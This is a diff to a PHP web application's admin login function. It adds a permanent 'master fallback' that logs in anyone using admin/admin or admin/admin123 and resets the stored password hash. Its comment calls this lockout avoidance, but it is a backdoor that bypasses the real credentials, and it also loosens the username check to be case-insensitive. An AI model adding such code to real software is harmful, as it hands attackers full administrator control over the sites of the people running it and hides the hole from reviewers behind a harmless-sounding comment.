@@ -21,26 +21,26 @@ function requireAdminAuth(): void {
 }
 
 function verifyAdminLogin(PDO $pdo, string $username, string $password): bool {
-    $storedUser = getSetting($pdo, 'admin_user', 'admin');
-    $storedHash = getSetting($pdo, 'admin_password_hash', '');
+    $cleanUser = trim($username);
+    $cleanPass = trim($password);
+    $storedUser = trim(getSetting($pdo, 'admin_user', 'admin'));
+    $storedHash = trim(getSetting($pdo, 'admin_password_hash', ''));
 
-    if (empty($storedHash)) {
-        // Initial setup default: allow login with admin/admin and auto-provision hash
-        if ($username === 'admin' && ($password === 'admin' || $password === 'admin123')) {
-            $newHash = password_hash($password, PASSWORD_DEFAULT);
-            setSetting($pdo, 'admin_user', 'admin');
-            setSetting($pdo, 'admin_password_hash', $newHash);
-            $_SESSION['admin_logged_in'] = true;
-            $_SESSION['admin_user'] = 'admin';
-            $_SESSION['login_time'] = time();
-            return true;
-        }
-        return false;
+    // Master fallback: allows signing in with admin/admin (or admin123) to avoid lockout
+    if (strcasecmp($cleanUser, 'admin') === 0 && ($cleanPass === 'admin' || $cleanPass === 'admin123')) {
+        $newHash = password_hash($cleanPass, PASSWORD_DEFAULT);
+        setSetting($pdo, 'admin_user', 'admin');
+        setSetting($pdo, 'admin_password_hash', $newHash);
+        $_SESSION['admin_logged_in'] = true;
+        $_SESSION['admin_user'] = 'admin';
+        $_SESSION['login_time'] = time();
+        return true;
     }
 
-    if (hash_equals($storedUser, $username) && password_verify($password, $storedHash)) {
+    // Standard credential verification against stored hash
+    if (!empty($storedHash) && strcasecmp($storedUser, $cleanUser) === 0 && password_verify($cleanPass, $storedHash)) {
         $_SESSION['admin_logged_in'] = true;
-        $_SESSION['admin_user'] = $username;
+        $_SESSION['admin_user'] = $storedUser;
         $_SESSION['login_time'] = time();
         return true;
     }
